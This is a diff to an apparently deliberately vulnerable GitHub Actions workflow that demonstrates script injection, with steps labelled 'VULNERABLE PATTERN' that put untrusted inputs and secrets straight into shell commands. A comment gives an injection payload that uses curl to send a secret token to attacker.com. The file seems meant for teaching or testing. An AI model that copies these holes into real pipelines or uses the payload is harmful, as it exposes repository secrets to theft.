@@ -23,14 +23,6 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Load secrets (for demonstration)
-        env:
-          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
-          DEMO_AWS_KEY: ${{ secrets.DEMO_AWS_KEY }}
-        run: |
-          echo "DEMO_SECRET=$DEMO_SECRET" >> $GITHUB_ENV
-          echo "DEMO_AWS_KEY=$DEMO_AWS_KEY" >> $GITHUB_ENV
-
       - name: Configure Git (VULNERABLE PATTERN 1)
         run: |
           git config user.name "${{ github.actor }}"
@@ -62,8 +54,22 @@ jobs:
           git commit -m "Update ${{ inputs.package_name }} to ${{ inputs.package_version }}"
         # ⚠️ VULNERABLE: Commit messages with untrusted input
 
-      - name: Summary
+      - name: Send notification (VULNERABLE PATTERN 6 - Direct Secret Usage)
         run: |
-          echo "✅ Package ${{ inputs.package_name }} updated to ${{ inputs.package_version }}"
-          echo "🔒 Demo secrets are available: $DEMO_SECRET"
-        # ⚠️ This shows the secret is accessible in the workflow
+          curl -X POST "https://hooks.example.com/notify" \
+            -H "Authorization: Bearer ${{ secrets.DEMO_SECRET }}" \
+            -d "package=${{ inputs.package_name }}" \
+            -d "version=${{ inputs.package_version }}" \
+            -d "status=updated"
+        # ⚠️ CRITICAL: Secrets used DIRECTLY in run command with untrusted input
+        # This is extremely dangerous - both the secret AND input are in the same interpolation context
+        # Attack: package_name = '$(curl https://attacker.com?token=${{ secrets.DEMO_SECRET }})'
+
+      - name: AWS Deploy (VULNERABLE PATTERN 7 - Direct Secret in Command)
+        run: |
+          echo "Deploying to S3 with region: ${{ inputs.package_version }}"
+          # In real scenario:
+          # aws s3 cp build/ s3://bucket-${{ inputs.package_name }}/ \
+          #   --access-key-id ${{ secrets.DEMO_AWS_KEY }} \
+          #   --region ${{ inputs.package_version }}
+        # ⚠️ CRITICAL: Secrets directly in command, injectable via bucket name or region
